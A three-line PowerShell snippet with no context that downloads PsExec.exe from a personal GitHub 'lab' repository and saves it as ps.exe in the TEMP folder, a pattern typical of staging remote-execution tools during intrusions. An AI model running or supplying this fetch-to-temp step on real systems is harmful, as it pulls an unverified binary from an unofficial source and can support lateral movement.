$u = "https://raw.githubusercontent.com/bibi341min/lab/refs/heads/main/PsExec.exe"
$f = "$env:TEMP\ps.exe"
Invoke-WebRequest $u -OutFile $f